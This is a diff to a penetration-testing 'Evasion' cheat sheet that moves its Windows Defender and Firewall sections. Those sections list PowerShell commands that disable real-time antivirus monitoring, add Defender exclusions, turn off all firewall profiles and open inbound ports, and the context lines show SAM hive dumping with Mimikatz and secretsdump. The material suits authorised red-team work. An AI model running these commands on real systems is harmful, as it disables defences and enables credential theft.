@@ -1,6 +1,8 @@
 # Evasion
 ## Index
 * [General](#General)
+* [Windows Defender](#Windows-Defender)
+* [Windows Firewall](#Windows-Firewall)
 * [PowerShell](#PowerShell)
    * [Execution-policy](#Execution-policy)
    * [AMSI](#AMSI)
@@ -10,8 +12,6 @@
    * [Just Enough Admin](#Just-Enough-Admin)
 * [Applocker](#Applocker)
   * [LOLBAS](#LOLBAS)
-* [Windows Defender](#Windows-Defender)
-* [Windows Firewall](#Windows-Firewall)
 * [Defeating AV](#Defeating-AV)
   * [Obfuscation tools](#Obfuscation-tools)
   * [Evasion techniques](#Evasion-techniques)
@@ -27,13 +27,82 @@
 gpresult /H gpos.html
 ```
 
+## Windows Defender
+#### Check if windows defender is running
+```
+Get-MpComputerStatus
+Get-MpComputerStatus | Select RealTimeProtectionEnabled
+```
+
+#### Get info about Windows Defender
+```
+Get-MpPreference
+```
+
+#### Find excluded folder from Windows Defender
+```
+Get-MpPreference | select Exclusion*
+(Get-MpPreference).Exclusionpath
+```
+
+#### Create exclusion
+```
+Set-MpPreference -ExclusionPath "<path>"
+```
+
+#### Disable AV monitoring
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPReference -DisableIOAVProtection $true
+
+powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
+```
+
+## Windows Firewall
+#### Get state
+```
+Get-NetFirewallProfile -PolicyStore ActiveStore
+```
+
+#### Get rules
+```
+Get-netfirewallrule | format-table name,displaygroup,action,direction,enabled -autosize
+```
+
+#### Disable Firewall
+```
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
+```
+
+#### Enable firewall
+```
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
+```
+
+#### Change default policy
+```
+Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow 
+```
+
+#### Open port on firewall
+```
+netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protocol=TCP localport=<PORT>
+
+New-NetFirewallRule -DisplayName "Allow port" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT>
+```
+
+#### Remove firewall rule
+```
+Remove-NetFirewallRule -DisplayName "Allow port"
+```
+
+## PowerShell
 #### Powershell detections
 - System-wide transcription
 - Script Block logging 
 - AntiMalware Scan Interface (AMSI)
 - Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
 
-## PowerShell
 ### Start 64 bit powershell
 ```
 %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
@@ -366,75 +435,6 @@ reg save HKLM\SAM sam.bak
 
 Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
 secretsdump.py -sam sam.bak -security security.bak -system system.bak local
-```
-
-## Windows Defender
-#### Check if windows defender is running
-```
-Get-MpComputerStatus
-Get-MpComputerStatus | Select RealTimeProtectionEnabled
-```
-
-#### Get info about Windows Defender
-```
-Get-MpPreference
-```
-
-#### Find excluded folder from Windows Defender
-```
-Get-MpPreference | select Exclusion*
-(Get-MpPreference).Exclusionpath
-```
-
-#### Create exclusion
-```
-Set-MpPreference -ExclusionPath "<path>"
-```
-
-#### Disable AV monitoring
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPReference -DisableIOAVProtection $true
-
-powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
-```
-
-## Windows Firewall
-#### Get state
-```
-Get-NetFirewallProfile -PolicyStore ActiveStore
-```
-
-#### Get rules
-```
-Get-netfirewallrule | format-table name,displaygroup,action,direction,enabled -autosize
-```
-
-#### Disable Firewall
-```
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
-```
-
-#### Enable firewall
-```
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
-```
-
-#### Change default policy
-```
-Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow 
-```
-
-#### Open port on firewall
-```
-netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protocol=TCP localport=<PORT>
-
-New-NetFirewallRule -DisplayName "Allow port" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT>
-```
-
-#### Remove firewall rule
-```
-Remove-NetFirewallRule -DisplayName "Allow port"
 ```
 
 ## Defeating AV
